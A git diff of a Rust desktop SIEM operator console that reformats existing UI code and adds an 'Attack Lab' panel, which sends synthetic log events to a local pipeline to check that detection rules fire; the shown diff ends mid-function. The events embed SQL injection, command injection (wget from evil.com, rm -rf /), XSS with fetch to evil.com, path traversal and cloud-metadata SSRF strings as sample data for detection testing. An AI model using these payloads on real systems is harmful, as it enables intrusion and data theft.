@@ -3,7 +3,7 @@ use eframe::egui;
 use crate::models::CaseBrief;
 use crate::ui::widgets::{pill_label, severity_color};
 
-use super::{OperatorApp, PendingAction, Section};
+use super::{ATTACKS, AttackLabResult, AttackLogEntry, OperatorApp, PendingAction, Section};
 
 pub(super) fn build_case_sparkline_series(cases: &[CaseBrief]) -> (Vec<f32>, Vec<f32>) {
     let mut open = vec![0.0_f32; 8];
@@ -51,33 +51,63 @@ impl OperatorApp {
                         self.palette_open = false;
                     }
                 };
-                action("overview", "Go: Overview", &mut |s| s.section = Section::Overview);
-                action("detections", "Go: Detections", &mut |s| s.section = Section::Detections);
+                action("overview", "Go: Overview", &mut |s| {
+                    s.section = Section::Overview
+                });
+                action("detections", "Go: Detections", &mut |s| {
+                    s.section = Section::Detections
+                });
                 action("alerts", "Go: Alerts", &mut |s| s.section = Section::Alerts);
                 action("events", "Go: Events", &mut |s| s.section = Section::Events);
-                action("investigations", "Go: Investigations", &mut |s| s.section = Section::Investigations);
+                action("investigations", "Go: Investigations", &mut |s| {
+                    s.section = Section::Investigations
+                });
                 action("assets", "Go: Assets", &mut |s| s.section = Section::Assets);
                 action("cases", "Go: Cases", &mut |s| s.section = Section::Cases);
-                action("stack", "Go: Stack Control", &mut |s| s.section = Section::StackControl);
-                action("settings", "Go: Settings", &mut |s| s.section = Section::Settings);
+                action("stack", "Go: Stack Control", &mut |s| {
+                    s.section = Section::StackControl
+                });
+                action("settings", "Go: Settings", &mut |s| {
+                    s.section = Section::Settings
+                });
                 action("refresh", "Action: Refresh cases", &mut |s| s.fetch_cases());
-                action("refresh events", "Action: Refresh events", &mut |s| s.fetch_events());
-                action("refresh assets", "Action: Refresh assets", &mut |s| s.fetch_assets());
-                action("refresh detections", "Action: Refresh detections", &mut |s| s.fetch_detections());
-                action("docker up", "Action: Docker start stack", &mut |s| s.run_docker_compose_action("up"));
-                action("docker down", "Action: Docker stop stack", &mut |s| s.run_docker_compose_action("down"));
+                action("refresh events", "Action: Refresh events", &mut |s| {
+                    s.fetch_events()
+                });
+                action("refresh assets", "Action: Refresh assets", &mut |s| {
+                    s.fetch_assets()
+                });
+                action(
+                    "refresh detections",
+                    "Action: Refresh detections",
+                    &mut |s| s.fetch_detections(),
+                );
+                action("docker up", "Action: Docker start stack", &mut |s| {
+                    s.run_docker_compose_action("up")
+                });
+                action("docker down", "Action: Docker stop stack", &mut |s| {
+                    s.run_docker_compose_action("down")
+                });
                 action("docker restart", "Action: Docker restart stack", &mut |s| {
                     s.run_docker_compose_action("restart")
                 });
-                action("docker ps", "Action: Docker stack status", &mut |s| s.run_docker_compose_action("ps"));
-                action("assign", "Action: Assign selected to me", &mut |s| s.assign_selected_to_me());
-                action("close", "Action: Close selected", &mut |s| s.close_selected("Closed via command palette"));
+                action("docker ps", "Action: Docker stack status", &mut |s| {
+                    s.run_docker_compose_action("ps")
+                });
+                action("assign", "Action: Assign selected to me", &mut |s| {
+                    s.assign_selected_to_me()
+                });
+                action("close", "Action: Close selected", &mut |s| {
+                    s.close_selected("Closed via command palette")
+                });
                 action("obs", "Action: Refresh Prometheus/Alertmanager", &mut |s| {
                     s.fetch_observability_snapshot()
                 });
-                action("portal", "Action: Refresh portal links (Grafana)", &mut |s| {
-                    s.fetch_portal_ui_config()
-                });
+                action(
+                    "portal",
+                    "Action: Refresh portal links (Grafana)",
+                    &mut |s| s.fetch_portal_ui_config(),
+                );
             });
         self.palette_open = open;
     }
@@ -117,7 +147,8 @@ impl OperatorApp {
                                             self.pending_action = None;
                                             return;
                                         }
-                                        self.status = format!("{} closed: {}", case.display_key, reason);
+                                        self.status =
+                                            format!("{} closed: {}", case.display_key, reason);
                                         audit = Some(format!(
                                             "Confirmed critical close {} ({})",
                                             case.display_key, reason
@@ -216,13 +247,17 @@ impl OperatorApp {
                                     if ui
                                         .selectable_label(
                                             self.detection_filters.severity == v
-                                                || (self.detection_filters.severity.is_empty() && v == "All"),
+                                                || (self.detection_filters.severity.is_empty()
+                                                    && v == "All"),
                                             v,
                                         )
                                         .clicked()
                                     {
-                                        self.detection_filters.severity =
-                                            if v == "All" { String::new() } else { v.to_string() };
+                                        self.detection_filters.severity = if v == "All" {
+                                            String::new()
+                                        } else {
+                                            v.to_string()
+                                        };
                                     }
                                 }
                             });
@@ -252,13 +287,17 @@ impl OperatorApp {
                                     if ui
                                         .selectable_label(
                                             self.detection_filters.severity == v
-                                                || (self.detection_filters.severity.is_empty() && v == "All"),
+                                                || (self.detection_filters.severity.is_empty()
+                                                    && v == "All"),
                                             v,
                                         )
                                         .clicked()
                                     {
-                                        self.detection_filters.severity =
-                                            if v == "All" { String::new() } else { v.to_string() };
+                                        self.detection_filters.severity = if v == "All" {
+                                            String::new()
+                                        } else {
+                                            v.to_string()
+                                        };
                                     }
                                 }
                             });
@@ -272,31 +311,36 @@ impl OperatorApp {
             .corner_radius(egui::CornerRadius::same(10))
             .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(43, 56, 74)))
             .inner_margin(egui::Margin::symmetric(12, 10))
-            .show(ui, |ui| egui::Grid::new("detections_grid").striped(true).show(ui, |ui| {
-            ui.strong("Rule");
-            ui.strong("Severity");
-            ui.strong("State");
-            ui.strong("Signal");
-            ui.end_row();
-            for d in &self.detections {
-                let matches_search = self.detection_filters.search.trim().is_empty()
-                    || d.rule
-                        .to_lowercase()
-                        .contains(&self.detection_filters.search.to_lowercase());
-                let matches_sev = self.detection_filters.severity.is_empty()
-                    || d.severity.eq_ignore_ascii_case(&self.detection_filters.severity);
-                if !(matches_search && matches_sev) {
-                    continue;
-                }
-                if ui.selectable_label(false, &d.rule).clicked() {
-                    open_investigation = Some(d.rule.clone());
-                }
-                pill_label(ui, &d.severity, severity_color(&d.severity));
-                ui.label(&d.state);
-                ui.label(&d.signal);
-                ui.end_row();
-            }
-        }));
+            .show(ui, |ui| {
+                egui::Grid::new("detections_grid")
+                    .striped(true)
+                    .show(ui, |ui| {
+                        ui.strong("Rule");
+                        ui.strong("Severity");
+                        ui.strong("State");
+                        ui.strong("Signal");
+                        ui.end_row();
+                        for d in &self.detections {
+                            let matches_search = self.detection_filters.search.trim().is_empty()
+                                || d.rule
+                                    .to_lowercase()
+                                    .contains(&self.detection_filters.search.to_lowercase());
+                            let matches_sev = self.detection_filters.severity.is_empty()
+                                || d.severity
+                                    .eq_ignore_ascii_case(&self.detection_filters.severity);
+                            if !(matches_search && matches_sev) {
+                                continue;
+                            }
+                            if ui.selectable_label(false, &d.rule).clicked() {
+                                open_investigation = Some(d.rule.clone());
+                            }
+                            pill_label(ui, &d.severity, severity_color(&d.severity));
+                            ui.label(&d.state);
+                            ui.label(&d.signal);
+                            ui.end_row();
+                        }
+                    })
+            });
         if let Some(entity) = open_investigation {
             self.investigation_entity = entity.clone();
             self.section = Section::Investigations;
@@ -394,8 +438,7 @@ impl OperatorApp {
         ui.horizontal_wrapped(|ui| {
             ui.label("Add note to timeline:");
             ui.add(
-                egui::TextEdit::singleline(&mut self.investigation_note_input)
-                    .desired_width(320.0),
+                egui::TextEdit::singleline(&mut self.investigation_note_input).desired_width(320.0),
             );
             if ui.button("Post").clicked() {
                 let body = self.investigation_note_input.trim().to_string();
@@ -424,7 +467,10 @@ impl OperatorApp {
                 ui.add_space(8.0);
                 ui.horizontal_wrapped(|ui| {
                     if ui
-                        .add_enabled(!self.stack_status_loading, egui::Button::new("Portal status"))
+                        .add_enabled(
+                            !self.stack_status_loading,
+                            egui::Button::new("Portal status"),
+                        )
                         .clicked()
                     {
                         self.fetch_stack_status();
@@ -463,23 +509,25 @@ impl OperatorApp {
             });
         if !self.stack_status.is_empty() {
             ui.add_space(8.0);
-            egui::Grid::new("stack_status_grid").striped(true).show(ui, |ui| {
-                ui.strong("Service");
-                ui.strong("Status");
-                ui.strong("Details");
-                ui.end_row();
-                for row in &self.stack_status {
-                    ui.label(&row.service);
-                    let color = if row.status.eq_ignore_ascii_case("up") {
-                        egui::Color32::from_rgb(90, 200, 140)
-                    } else {
-                        egui::Color32::from_rgb(235, 75, 85)
-                    };
-                    pill_label(ui, &row.status, color);
-                    ui.label(&row.detail);
+            egui::Grid::new("stack_status_grid")
+                .striped(true)
+                .show(ui, |ui| {
+                    ui.strong("Service");
+                    ui.strong("Status");
+                    ui.strong("Details");
                     ui.end_row();
-                }
-            });
+                    for row in &self.stack_status {
+                        ui.label(&row.service);
+                        let color = if row.status.eq_ignore_ascii_case("up") {
+                            egui::Color32::from_rgb(90, 200, 140)
+                        } else {
+                            egui::Color32::from_rgb(235, 75, 85)
+                        };
+                        pill_label(ui, &row.status, color);
+                        ui.label(&row.detail);
+                        ui.end_row();
+                    }
+                });
         }
         ui.add_space(8.0);
         egui::Frame::new()
@@ -487,8 +535,807 @@ impl OperatorApp {
             .corner_radius(egui::CornerRadius::same(10))
             .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(43, 56, 74)))
             .inner_margin(egui::Margin::symmetric(12, 10))
-            .show(ui, |ui| egui::ScrollArea::vertical().max_height(260.0).show(ui, |ui| {
-                ui.label(egui::RichText::new(&self.docker_last_output).monospace());
-            }));
+            .show(ui, |ui| {
+                egui::ScrollArea::vertical()
+                    .max_height(260.0)
+                    .show(ui, |ui| {
+                        ui.label(egui::RichText::new(&self.docker_last_output).monospace());
+                    })
+            });
+    }
+
+    // ── Attack Lab ────────────────────────────────────────────────────────────
+
+    pub(super) fn show_attack_lab_panel(&mut self, ui: &mut egui::Ui) {
+        // Check for background result
+        if let Some(rx) = &self.attack_rx {
+            if let Ok(result) = rx.try_recv() {
+                self.attack_sending = false;
+                self.attack_rx = None;
+                match result {
+                    Ok(r) => {
+                        let entry = AttackLogEntry {
+                            timestamp: chrono::Utc::now().to_rfc3339(),
+                            attack_name: r.attack_name.clone(),
+                            rule_id: r.rule_id.clone(),
+                            events_sent: r.events_sent,
+                            events_failed: r.events_failed,
+                            alert_detected: r.alert_detected,
+                            alert_severity: r.alert_severity.clone(),
+                        };
+                        self.attack_log.insert(0, entry);
+                        if self.attack_log.len() > 50 {
+                            self.attack_log.truncate(50);
+                        }
+                        self.attack_result = Some(r);
+                    }
+                    Err(e) => {
+                        self.attack_result = Some(AttackLabResult {
+                            attack_name: String::new(),
+                            rule_id: String::new(),
+                            events_sent: 0,
+                            events_failed: 0,
+                            alert_detected: false,
+                            alert_severity: String::new(),
+                            alert_description: format!("Error: {}", e),
+                        });
+                    }
+                }
+            }
+        }
+
+        // Header
+        egui::Frame::new()
+            .fill(egui::Color32::from_rgb(24, 30, 42))
+            .corner_radius(egui::CornerRadius::same(12))
+            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
+            .inner_margin(egui::Margin::symmetric(14, 12))
+            .show(ui, |ui| {
+                ui.label(egui::RichText::new("Attack Lab").strong().size(24.0));
+                ui.label("Generate attack events and verify detection rules fire correctly.");
+                ui.add_space(8.0);
+
+                ui.horizontal(|ui| {
+                    ui.label(egui::RichText::new("Select Attack:").strong());
+                });
+
+                ui.add_space(4.0);
+
+                // Attack selection grid
+                egui::Grid::new("attack_selection_grid")
+                    .spacing([8.0, 4.0])
+                    .show(ui, |ui| {
+                        for (i, atk) in ATTACKS.iter().enumerate() {
+                            let selected = self.attack_selected == i;
+                            let bg = if selected {
+                                egui::Color32::from_rgb(40, 80, 70)
+                            } else {
+                                egui::Color32::from_rgb(30, 38, 52)
+                            };
+                            let border = if selected {
+                                egui::Color32::from_rgb(64, 230, 198)
+                            } else {
+                                egui::Color32::from_rgb(46, 58, 79)
+                            };
+                            let resp = egui::Frame::new()
+                                .fill(bg)
+                                .corner_radius(egui::CornerRadius::same(8))
+                                .stroke(egui::Stroke::new(if selected { 2.0 } else { 1.0 }, border))
+                                .inner_margin(egui::Margin::symmetric(10, 6))
+                                .show(ui, |ui| {
+                                    ui.horizontal(|ui| {
+                                        let sev_color = match atk.severity {
+                                            "critical" => egui::Color32::from_rgb(235, 75, 85),
+                                            "high" => egui::Color32::from_rgb(235, 160, 50),
+                                            "medium" => egui::Color32::from_rgb(50, 180, 235),
+                                            _ => egui::Color32::GRAY,
+                                        };
+                                        pill_label(ui, atk.severity, sev_color);
+                                        ui.add_space(4.0);
+                                        ui.label(egui::RichText::new(atk.name).strong());
+                                    });
+                                    ui.horizontal(|ui| {
+                                        ui.label(
+                                            egui::RichText::new(format!(
+                                                "{} | {} events",
+                                                atk.mitre, atk.event_count
+                                            ))
+                                            .small()
+                                            .color(egui::Color32::from_rgb(150, 160, 180)),
+                                        );
+                                    });
+                                    ui.horizontal(|ui| {
+                                        ui.label(
+                                            egui::RichText::new(atk.description)
+                                                .small()
+                                                .color(egui::Color32::from_rgb(130, 140, 160)),
+                                        );
+                                    });
+                                });
+                            if resp.response.clicked() {
+                                self.attack_selected = i;
+                            }
+                            if (i + 1) % 3 == 0 {
+                                ui.end_row();
+                            }
+                        }
+                    });
+            });
+
+        ui.add_space(8.0);
+
+        // Selected attack detail + Launch button
+        let atk = &ATTACKS[self.attack_selected];
+        egui::Frame::new()
+            .fill(egui::Color32::from_rgb(24, 30, 42))
+            .corner_radius(egui::CornerRadius::same(12))
+            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(46, 58, 79)))
+            .inner_margin(egui::Margin::symmetric(14, 12))
+            .show(ui, |ui| {
+                ui.horizontal(|ui| {
+                    ui.label(
+                        egui::RichText::new(format!("Target: {}", atk.name))
+                            .strong()
+                            .size(18.0),
+                    );
+                    let sev_color = match atk.severity {
+                        "critical" => egui::Color32::from_rgb(235, 75, 85),
+                        "high" => egui::Color32::from_rgb(235, 160, 50),
+                        "medium" => egui::Color32::from_rgb(50, 180, 235),
+                        _ => egui::Color32::GRAY,
+                    };
+                    pill_label(ui, atk.severity, sev_color);
+                });
+                ui.label(
+                    egui::RichText::new(format!(
+                        "Rule: {}  |  MITRE: {}  |  Events: {}",
+                        atk.rule_id, atk.mitre, atk.event_count
+                    ))
+                    .color(egui::Color32::from_rgb(150, 160, 180)),
+                );
+                ui.add_space(8.0);
+
+                ui.horizontal(|ui| {
+                    let can_launch = !self.attack_sending;
+                    if ui
+                        .add_enabled(
+                            can_launch,
+                            egui::Button::new(
+                                egui::RichText::new("  Launch Attack  ").strong().size(16.0),
+                            )
+                            .fill(egui::Color32::from_rgb(180, 50, 50)),
+                        )
+                        .clicked()
+                    {
+                        self.launch_attack(self.attack_selected);
+                    }
+
+                    if ui
+                        .add_enabled(
+                            can_launch && ATTACKS.len() > 1,
+                            egui::Button::new("  Launch All  "),
+                        )
+                        .clicked()
+                    {
+                        // Launch first attack; user can repeat for others
+                        self.launch_attack(0);
+                    }
+
+                    if self.attack_sending {
+                        ui.spinner();
+                        ui.label("Sending events & waiting for detection...");
+                    }
+                });
+            });
+
+        // Result display
+        if let Some(ref result) = self.attack_result {
+            ui.add_space(8.0);
+            let (bg, border, icon) = if result.alert_detected {
+                (
+                    egui::Color32::from_rgb(15, 40, 25),
+                    egui::Color32::from_rgb(40, 180, 90),
+                    "DETECTED",
+                )
+            } else {
+                (
+                    egui::Color32::from_rgb(50, 25, 20),
+                    egui::Color32::from_rgb(200, 60, 50),
+                    "NOT DETECTED",
+                )
+            };
+            egui::Frame::new()
+                .fill(bg)
+                .corner_radius(egui::CornerRadius::same(12))
+                .stroke(egui::Stroke::new(2.0, border))
+                .inner_margin(egui::Margin::symmetric(14, 12))
+                .show(ui, |ui| {
+                    ui.horizontal(|ui| {
+                        ui.label(egui::RichText::new(icon).strong().size(20.0).color(border));
+                        ui.add_space(8.0);
+                        ui.label(
+                            egui::RichText::new(format!(
+                                "{} ({})",
+                                result.attack_name, result.rule_id
+                            ))
+                            .strong(),
+                        );
+                    });
+                    ui.label(format!(
+                        "Events sent: {} | Failed: {}",
+                        result.events_sent, result.events_failed
+                    ));
+                    if result.alert_detected {
+                        let sev_color = match result.alert_severity.as_str() {
+                            "critical" => egui::Color32::from_rgb(235, 75, 85),
+                            "high" => egui::Color32::from_rgb(235, 160, 50),
+                            "medium" => egui::Color32::from_rgb(50, 180, 235),
+                            _ => egui::Color32::GRAY,
+                        };
+                        ui.horizontal(|ui| {
+                            ui.label("Alert severity:");
+                            pill_label(ui, &result.alert_severity, sev_color);
+                        });
+                        if !result.alert_description.is_empty() {
+                            ui.label(
+                                egui::RichText::new(&result.alert_description)
+                                    .small()
+                                    .color(egui::Color32::from_rgb(180, 190, 200)),
+                            );
+                        }
+                    } else {
+                        ui.label(
+                            egui::RichText::new(
+                                "Check correlator logs: docker logs siem-correlator",
+                            )
+                            .small()
+                            .color(egui::Color32::from_rgb(180, 120, 100)),
+                        );
+                    }
+                });
+        }
+
+        // Attack log
+        if !self.attack_log.is_empty() {
+            ui.add_space(8.0);
+            ui.label(egui::RichText::new("Attack History").strong().size(16.0));
+            ui.add_space(4.0);
+            egui::Grid::new("attack_log_grid")
+                .striped(true)
+                .show(ui, |ui| {
+                    ui.strong("Time");
+                    ui.strong("Attack");
+                    ui.strong("Rule");
+                    ui.strong("Sent");
+                    ui.strong("Result");
+                    ui.end_row();
+                    for entry in &self.attack_log {
+                        let ts = entry.timestamp.get(11..19).unwrap_or(&entry.timestamp);
+                        ui.label(egui::RichText::new(ts).monospace().small());
+                        ui.label(&entry.attack_name);
+                        ui.label(egui::RichText::new(&entry.rule_id).monospace().small());
+                        ui.label(entry.events_sent.to_string());
+                        if entry.alert_detected {
+                            pill_label(
+                                ui,
+                                &entry.alert_severity,
+                                egui::Color32::from_rgb(40, 180, 90),
+                            );
+                        } else {
+                            pill_label(ui, "missed", egui::Color32::from_rgb(200, 60, 50));
+                        }
+                        ui.end_row();
+                    }
+                });
+        }
+    }
+
+    fn launch_attack(&mut self, attack_idx: usize) {
+        let atk = &ATTACKS[attack_idx];
+        let vector_url = std::env::var("SIEM_OPERATOR_VECTOR_URL")
+            .unwrap_or_else(|_| "http://127.0.0.1:8080/logs".to_string());
+        let alertmanager_url = self.alertmanager_direct_base();
+        let rule_id = atk.rule_id.to_string();
+        let attack_name = atk.name.to_string();
+        let events = Self::build_attack_events(attack_idx);
+
+        self.attack_sending = true;
+        self.attack_result = None;
+
+        let (tx, rx) = std::sync::mpsc::channel();
+        self.attack_rx = Some(rx);
+
+        std::thread::spawn(move || {
+            let result = Self::run_attack(
+                &vector_url,
+                &alertmanager_url,
+                &rule_id,
+                &attack_name,
+                events,
+            );
+            let _ = tx.send(Ok(result));
+        });
+    }
+
+    fn build_attack_events(attack_idx: usize) -> Vec<serde_json::Value> {
+        let now = chrono::Utc::now().to_rfc3339();
+        let attacker_ips = [
+            "203.0.113.99",
+            "203.0.113.5",
+            "203.0.113.12",
+            "203.0.113.88",
+            "198.51.100.20",
+            "198.51.100.55",
+        ];
+
+        let mut events = Vec::new();
+
+        match attack_idx {
+            // 0: Brute Force
+            0 => {
+                for i in 0..15 {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Error",
+                        "Message": format!("HTTP POST /api/auth/login responded 401 in {}ms", 20 + i),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[0],
+                            "RequestMethod": "POST",
+                            "RequestPath": "/api/auth/login",
+                            "StatusCode": 401,
+                            "Elapsed": 20 + i,
+                            "UserId": format!("user-{}", i % 3)
+                        }
+                    }));
+                }
+            }
+            // 1: SQL Injection
+            1 => {
+                let payloads = [
+                    ("' OR '1'='1", "/api/users/search?q="),
+                    (
+                        "UNION SELECT null,username,password FROM users--",
+                        "/api/products?sort=",
+                    ),
+                    ("; DROP TABLE users;--", "/api/admin/cleanup?cmd="),
+                    ("$where: \"this.password\"", "/api/auth/token"),
+                    ("0x414141414141", "/api/data/export?format="),
+                ];
+                for (i, (payload, path)) in payloads.iter().enumerate() {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Error",
+                        "Message": format!("Query failed: {}", payload),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[i % attacker_ips.len()],
+                            "RequestMethod": "POST",
+                            "RequestPath": format!("{}{}", path, &payload[..payload.len().min(30)]),
+                            "StatusCode": 500,
+                            "Elapsed": 150 + i as i64 * 10
+                        }
+                    }));
+                }
+            }
+            // 2: Command Injection
+            2 => {
+                let payloads = [
+                    ("; cat /etc/passwd", "/api/search?q="),
+                    ("$(wget http://evil.com/shell.sh)", "/api/tools/run?cmd="),
+                    ("| bash -c 'id'", "/api/exec?input="),
+                    ("; rm -rf /", "/api/admin/cleanup?dir="),
+                ];
+                for (i, (payload, path)) in payloads.iter().enumerate() {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Warning",
+                        "Message": format!("Request processed: {}", payload),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[i % attacker_ips.len()],
+                            "RequestMethod": "POST",
+                            "RequestPath": format!("{}{}", path, &payload[..payload.len().min(20)]),
+                            "StatusCode": 200,
+                            "Elapsed": 30
+                        }
+                    }));
+                }
+                // 5th event with subshell
+                events.push(serde_json::json!({
+                    "Timestamp": now,
+                    "Level": "Warning",
+                    "Message": "$(cat /etc/hosts)",
+                    "SourceType": "dotnet",
+                    "Host": "api-01",
+                    "Properties": {
+                        "ClientIp": attacker_ips[3],
+                        "RequestMethod": "GET",
+                        "RequestPath": "/api/debug",
+                        "StatusCode": 200,
+                        "Elapsed": 25
+                    }
+                }));
+            }
+            // 3: XSS
+            3 => {
+                let payloads = [
+                    ("<script>alert('xss')</script>", "/api/comments"),
+                    ("<img src=x onerror=alert(1)>", "/api/profile/bio"),
+                    ("javascript:document.cookie", "/api/redirect?url="),
+                    ("<svg onload=fetch('http://evil.com/')>", "/api/upload/name"),
+                ];
+                for (i, (payload, path)) in payloads.iter().enumerate() {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Warning",
+                        "Message": format!("Input received: {}", &payload[..payload.len().min(60)]),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[i % attacker_ips.len()],
+                            "RequestMethod": "POST",
+                            "RequestPath": *path,
+                            "StatusCode": 200,
+                            "Elapsed": 25
+                        }
+                    }));
+                }
+                // 5th: encoded XSS
+                events.push(serde_json::json!({
+                    "Timestamp": now,
+                    "Level": "Warning",
+                    "Message": "%3Cscript%3Ealert(1)%3C/script%3E",
+                    "SourceType": "dotnet",
+                    "Host": "api-01",
+                    "Properties": {
+                        "ClientIp": attacker_ips[4],
+                        "RequestMethod": "GET",
+                        "RequestPath": "/api/search?q=%3Cscript%3E",
+                        "StatusCode": 200,
+                        "Elapsed": 20
+                    }
+                }));
+            }
+            // 4: Path Traversal
+            4 => {
+                let payloads = [
+                    "../../etc/passwd",
+                    "..\\\\..\\\\windows\\\\system32",
+                    "%2e%2e%2f%2e%2e%2fetc/shadow",
+                    "....//....//etc/hosts",
+                    "/proc/self/environ",
+                ];
+                for (i, payload) in payloads.iter().enumerate() {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Warning",
+                        "Message": format!("File access: {}", payload),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[i % attacker_ips.len()],
+                            "RequestMethod": "GET",
+                            "RequestPath": format!("/api/files?path={}", payload),
+                            "StatusCode": if i == 0 { 200 } else { 403 },
+                            "Elapsed": 5
+                        }
+                    }));
+                }
+            }
+            // 5: SSRF
+            5 => {
+                let targets = [
+                    (
+                        "http://10.0.0.1/admin",
+                        "/api/fetch?url=http://10.0.0.1/admin",
+                    ),
+                    (
+                        "http://169.254.169.254/latest/meta-data/",
+                        "/api/proxy?dest=http://169.254.169.254/latest/meta-data/",
+                    ),
+                    (
+                        "http://127.0.0.1:8080/debug",
+                        "/api/render?url=http://127.0.0.1:8080/debug",
+                    ),
+                    (
+                        "http://0.0.0.0/actuator/env",
+                        "/api/webhook?target=http://0.0.0.0/actuator/env",
+                    ),
+                ];
+                for (i, (desc, path)) in targets.iter().enumerate() {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Warning",
+                        "Message": format!("Fetch request: {}", desc),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[i % attacker_ips.len()],
+                            "RequestMethod": "POST",
+                            "RequestPath": *path,
+                            "StatusCode": 200,
+                            "Elapsed": 50,
+                            "TargetUrl": *desc
+                        }
+                    }));
+                }
+            }
+            // 6: Privilege Escalation
+            6 => {
+                let paths = [
+                    "/api/admin/users",
+                    "/api/internal/config",
+                    "/api/permissions/grant",
+                ];
+                for path in &paths {
+                    for _ in 0..3 {
+                        events.push(serde_json::json!({
+                            "Timestamp": now,
+                            "Level": "Error",
+                            "Message": format!("Access denied to {}", path),
+                            "SourceType": "dotnet",
+                            "Host": "api-01",
+                            "Properties": {
+                                "ClientIp": attacker_ips[4],
+                                "RequestMethod": "GET",
+                                "RequestPath": *path,
+                                "StatusCode": 403,
+                                "Elapsed": 10
+                            }
+                        }));
+                    }
+                }
+                // Role bypass
+                events.push(serde_json::json!({
+                    "Timestamp": now,
+                    "Level": "Warning",
+                    "Message": "Admin panel accessed",
+                    "SourceType": "dotnet",
+                    "Host": "api-01",
+                    "Properties": {
+                        "ClientIp": attacker_ips[4],
+                        "RequestMethod": "GET",
+                        "RequestPath": "/api/admin/dashboard",
+                        "StatusCode": 200,
+                        "Elapsed": 30,
+                        "UserId": "user-analyst",
+                        "UserRole": "analyst"
+                    }
+                }));
+            }
+            // 7: Rate Limit
+            7 => {
+                for i in 0..600 {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Information",
+                        "Message": format!("HTTP GET /api/products/{} responded 200 in 5ms", i),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[5],
+                            "RequestMethod": "GET",
+                            "RequestPath": format!("/api/products/{}", i),
+                            "StatusCode": 200,
+                            "Elapsed": 5
+                        }
+                    }));
+                }
+            }
+            // 8: Error Spike
+            8 => {
+                for i in 0..25 {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Error",
+                        "Message": "Unhandled exception on /api/orders: NullReferenceException",
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[2],
+                            "RequestMethod": "POST",
+                            "RequestPath": "/api/orders",
+                            "StatusCode": 500,
+                            "Elapsed": 200 + i
+                        }
+                    }));
+                }
+            }
+            // 9: Credential Stuffing
+            9 => {
+                for ip in attacker_ips.iter().take(6) {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Error",
+                        "Message": "HTTP POST /api/auth/login responded 401 in 35ms",
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": ip,
+                            "RequestMethod": "POST",
+                            "RequestPath": "/api/auth/login",
+                            "StatusCode": 401,
+                            "Elapsed": 35,
+                            "UserId": "admin@company.com"
+                        }
+                    }));
+                }
+            }
+            // 10: Unusual HTTP Methods
+            10 => {
+                let scenarios = [
+                    ("DELETE", "/api/admin/users/5", 200),
+                    ("PUT", "/api/config/settings", 200),
+                    ("PATCH", "/api/permissions/role", 200),
+                    ("DELETE", "/api/secrets/api-key", 403),
+                ];
+                for (i, (method, path, status)) in scenarios.iter().enumerate() {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": if *status == 200 { "Warning" } else { "Error" },
+                        "Message": format!("HTTP {} {} responded {}", method, path, status),
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[i % attacker_ips.len()],
+                            "RequestMethod": *method,
+                            "RequestPath": *path,
+                            "StatusCode": *status,
+                            "Elapsed": 20,
+                            "UserId": "attacker"
+                        }
+                    }));
+                }
+            }
+            // 11: Data Exfiltration
+            11 => {
+                for i in 0..100 {
+                    events.push(serde_json::json!({
+                        "Timestamp": now,
+                        "Level": "Information",
+                        "Message": "HTTP GET /api/reports/export responded 200 in 5200ms",
+                        "SourceType": "dotnet",
+                        "Host": "api-01",
+                        "Properties": {
+                            "ClientIp": attacker_ips[3],
+                            "RequestMethod": "GET",
+                            "RequestPath": "/api/reports/export",
+                            "StatusCode": 200,
+                            "Elapsed": 5200,
+                            "UserId": "user-suspicious",
+                            "ResponseSize": 5_000_000 + i * 100_000
+                        }
+                    }));
+                }
+            }
+            _ => {}
+        }
+
+        events
+    }
+
+    fn run_attack(
+        vector_url: &str,
+        alertmanager_url: &str,
+        rule_id: &str,
+        attack_name: &str,
+        events: Vec<serde_json::Value>,
+    ) -> AttackLabResult {
+        let client = match reqwest::blocking::Client::builder()
+            .timeout(std::time::Duration::from_secs(15))
+            .build()
+        {
+            Ok(c) => c,
+            Err(e) => {
+                return AttackLabResult {
+                    attack_name: attack_name.to_string(),
+                    rule_id: rule_id.to_string(),
+                    events_sent: 0,
+                    events_failed: events.len(),
+                    alert_detected: false,
+                    alert_severity: String::new(),
+                    alert_description: format!("HTTP client error: {}", e),
+                };
+            }
+        };
+
+        // Send events to Vector in batches of 50
+        let batch_size = 50;
+        let mut sent = 0usize;
+        let mut failed = 0usize;
+
+        for chunk in events.chunks(batch_size) {
+            let ndjson: String = chunk
+                .iter()
+                .map(|e| serde_json::to_string(e).unwrap_or_default())
+                .collect::<Vec<_>>()
+                .join("\n");
+
+            match client
+                .post(vector_url)
+                .header("Content-Type", "application/x-ndjson")
+                .body(ndjson)
+                .send()
+            {
+                Ok(resp) => {
+                    if resp.status().as_u16() < 300 {
